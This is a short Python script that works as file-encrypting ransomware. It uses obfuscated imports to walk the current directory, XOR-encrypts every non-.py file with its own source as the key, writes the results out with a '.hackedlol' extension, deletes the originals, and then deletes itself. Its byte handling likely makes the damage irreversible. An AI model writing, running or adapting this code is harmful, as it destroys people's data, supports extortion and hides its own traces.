os = __import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']());

os2 = __import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']());

thisscript=open(eval("__file__")).read()

for directory, subdirectories, files in os.walk(os.getcwd()):
    for filename in files:
        if not filename.endswith(".py"):
            plaindat=open(directory+"/"+filename, "rb").read();
            
            encrypted=open(directory+"/"+(filename.rsplit(".", 1)[0])+".hackedlol", "wb")
            
            for index in range(len(plaindat)):
                encrypted.write(chr(plaindat[index]^ord(thisscript[(index*0x27)%len(thisscript)])).encode())
            
            os.remove(directory+"/"+filename)

os2.remove(eval("__file__"))